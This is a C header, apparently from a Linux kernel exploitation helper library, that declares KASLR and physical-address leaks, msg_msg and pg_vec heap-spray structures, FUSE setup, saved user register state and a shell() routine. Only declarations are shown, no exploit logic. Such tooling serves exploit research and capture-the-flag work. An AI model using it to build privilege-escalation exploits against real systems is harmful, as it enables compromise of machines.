#define _GNU_SOURCE
#ifndef MYLIB_H
#define LIBX "v1.0"
#include <stdio.h>
#include <poll.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>
#include <string.h>
#include <stddef.h>
#include <unistd.h>
#include <signal.h>
#include <sys/un.h>
#include <assert.h>
#include <stdlib.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <pthread.h>
#include <keyutils.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <sys/prctl.h>
#include <asm/prctl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <sys/timerfd.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <linux/socket.h>
#include <linux/if_packet.h>
#include <linux/userfaultfd.h>
#include <linux/pkt_sched.h>
#include <linux/rtnetlink.h>
#include <net/if.h>



// Definations
#define MSG_COPY                    040000  /* copy (not remove) all queue messages */
#define TTYMAGIC                    0x5401
#define PIPE_NUM                    256
#define PAGE_SIZE                   0x1000
#define SOCKET_NUM                  0x20
#define unlikely(x)                 __builtin_expect(!!(x), 0)
#define SK_BUFF_NUM                 0x40
#define MSGMNB_FILE                 "/proc/sys/kernel/msgmnb"
#define NO_ASLR_BASE                0xffffffff81000000
#define cloneRoot_FLAG              CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND
#define OPTMEM_MAX_FILE             "/proc/sys/net/core/optmem_max"
#define INITIAL_PG_VEC_SPRAY        0x200
#define KASLR                       0xffffffff81000000ull //nokaslr value for debugging
#define MAGIC                       0xFFFFFFFFDEADBEEFull

typedef __SIZE_TYPE__ 	size_t;
typedef unsigned char       u8;
typedef unsigned short      u16;
typedef unsigned int        u32;
typedef unsigned long long  u64;
typedef unsigned long long u64;
// typedef unsigned long long size_t;
// typedef size_t u64;
// Structs
typedef struct msgSpray_t {
    struct msgSpray_t *next;
	__u8 *ctx;
	size_t size;
	size_t num;
    int msg_id;
} msgSpray_t;
typedef struct msgQueueMsg{
    long mtype;
    char mtext[1];
} msgMsg;

enum PG_VEC_CMD {
    ADD,
    FREE,
    EXIT
};
typedef struct
{
    enum PG_VEC_CMD cmd;
    int32_t idx;
    size_t order;
    size_t nr;
}ipc_req_t;



// Externel funcs
extern size_t           leakKASLR();
extern size_t           leakPHYS();
extern void *           initFuse(void);
extern int              sk_fd[0x20][2];
extern int              pipe_fd[PIPE_NUM*4][2];
extern size_t           user_cs, user_ss, user_rflags, user_sp;

// Export global vas
void shell(void);

// enum hfsc_class_flags {
// 	HFSC_RSC = 0x1,
// 	HFSC_FSC = 0x2,
// 	HFSC_USC = 0x4
// };
void libxInit(void );

// net related
#endif